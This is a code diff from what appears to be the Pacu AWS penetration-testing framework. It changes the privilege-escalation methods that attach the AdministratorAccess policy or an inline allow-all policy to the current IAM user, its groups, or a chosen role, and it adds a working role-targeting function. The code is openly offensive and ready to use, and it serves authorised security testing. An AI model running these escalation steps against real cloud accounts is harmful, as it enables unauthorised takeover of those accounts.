@@ -1074,20 +1074,18 @@ def AttachUserPolicy(pacu_main, print, input, fetch_data):
 
     client = pacu_main.get_boto3_client('iam')
 
-    policy_arn = input('    Is there a specific policy you want to add to your user? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
-    if not policy_arn:
-        policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+    print('Trying to attach an administrator policy to the current user...\n')
 
     try:
         active_aws_key = session.get_active_aws_key(pacu_main.database)
         client.attach_user_policy(
             UserName=active_aws_key['UserName'],
-            PolicyArn=policy_arn
+            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
         )
-        print('  Successfully attached policy {} to the current user! You should now have access to the permissions associated with that policy.'.format(policy_arn))
+        print('  Successfully attached an administrator policy to the current user! You should now have administrator access.\n')
         return True
     except Exception as error:
-        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, error))
+        print('  Failed to attach an administrator policy to the current user: {}\n'.format(error))
         return False
 
 
@@ -1117,32 +1115,57 @@ def AttachGroupPolicy(pacu_main, print, input, fetch_data):
             print('  Did not find any groups that the user belongs to. Skipping to the next privilege escalation method...\n')
             return False
 
-    print('Targeting group: {}\n'.format(group))
-
-    policy_arn = input('    Is there a specific policy you want to add to the target group? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
-    if not policy_arn:
-        policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+    print('Targeting group {}. Trying to attach an administrator policy to it...\n'.format(group))
 
     try:
-        active_aws_key = session.get_active_aws_key(pacu_main.database)
         client.attach_group_policy(
             GroupName=group,
-            PolicyArn=policy_arn
+            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
         )
-        print('  Successfully attached policy {} to the group {}! You should now have access to the permissions associated with that policy.\n'.format(policy_arn, group))
+        print('  Successfully attached an administrator policy to the group {}! Members of it should now have administrator access.\n'.format(group))
         return True
     except Exception as error:
-        print('  Failed to attach policy {} to the group {}.\n{}'.format(policy_arn, group, error))
+        print('  Failed to attach an administrator policy to group {}: {}\n'.format(group, error))
         return False
 
 
 def AttachRolePolicy(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
 
+    print('  Starting method PutRolePolicy...\n')
+
+    client = pacu_main.get_boto3_client('iam')
+
+    target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role = roles[int(choice)]['RoleName']
+
+    print('Targeting role {}. Trying to attach an administrator policy to it...'.format(target_role))
+
+    try:
+        client.attach_role_policy(
+            RoleName=target_role,
+            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+        )
+        print('  Successfully attached an administrator policy to role {}! That role should now have administrator access.\n'.format(target_role))
+        return True
+    except Exception as error:
+        print('  Failed to attach an administrator policy to role {}: {}\n'.format(target_role, error))
+        return False
 
 def PutUserPolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    active_key = session.get_active_aws_key(pacu_main.database)
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
 
     print('  Starting method PutUserPolicy...\n')
 
@@ -1153,7 +1176,7 @@ def PutUserPolicy(pacu_main, print, input, fetch_data):
     policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
     try:
         client.put_user_policy(
-            UserName=active_key.user_name,
+            UserName=active_aws_key.user_name,
             PolicyName=policy_name,
             PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
         )
@@ -1166,7 +1189,7 @@ def PutUserPolicy(pacu_main, print, input, fetch_data):
 
 def PutGroupPolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    active_key = session.get_active_aws_key(pacu_main.database)
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
 
     print('  Starting method PutGroupPolicy...\n')
 
@@ -1175,11 +1198,11 @@ def PutGroupPolicy(pacu_main, print, input, fetch_data):
     target_group = input('    Is there a specific group to target? Enter the name now or just press enter to enumerate a list of possible groups to choose from: ')
 
     if not target_group:
-        print('Found {} groups that the current user belongs to. Choose one below.'.format(len(active_key.groups)))
-        for i in range(0, len(active_key.groups)):
-            print('  [{}] {}'.format(i, active_key.groups[i]['GroupName']))
+        print('Found {} groups that the current user belongs to. Choose one below.'.format(len(active_aws_key.groups)))
+        for i in range(0, len(active_aws_key.groups)):
+            print('  [{}] {}'.format(i, active_aws_key.groups[i]['GroupName']))
         choice = int(input('Choose an option: '))
-        target_group = active_key.groups[choice]['GroupName']
+        target_group = active_aws_key.groups[choice]['GroupName']
 
     print('Targeting group {}. Trying to add an administrator policy to it...'.format(target_group))
 
@@ -1199,7 +1222,6 @@ def PutGroupPolicy(pacu_main, print, input, fetch_data):
 
 def PutRolePolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    active_key = session.get_active_aws_key(pacu_main.database)
 
     print('  Starting method PutRolePolicy...\n')
 
